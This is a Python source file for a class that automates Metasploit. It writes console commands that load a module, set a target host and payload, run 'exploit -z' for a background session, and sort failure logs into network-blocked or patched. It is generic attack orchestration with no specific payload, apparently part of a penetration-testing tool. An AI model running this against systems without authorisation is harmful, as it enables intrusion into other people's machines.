import time
from core.exceptions import FailureReason

class ExploiterUnit:
    def __init__(self, msf_client):
        self.msf = msf_client

    def execute(self, plan, target):
        console = self.msf.consoles.console()
        cmd = f"use {plan['module']}\nset RHOSTS {target}\nset PAYLOAD {plan['payload']}\n"
        for k, v in plan.get('options', {}).items():
            cmd += f"set {k} {v}\n"
        cmd += "exploit -z\n"
        console.write(cmd)
        return console

    def classify_log(self, log):
        if "connection refused" in log.lower(): return FailureReason.NETWORK_BLOCK
        if "exploit completed, but no session" in log.lower(): return FailureReason.PATCHED
        return FailureReason.UNDEFINED
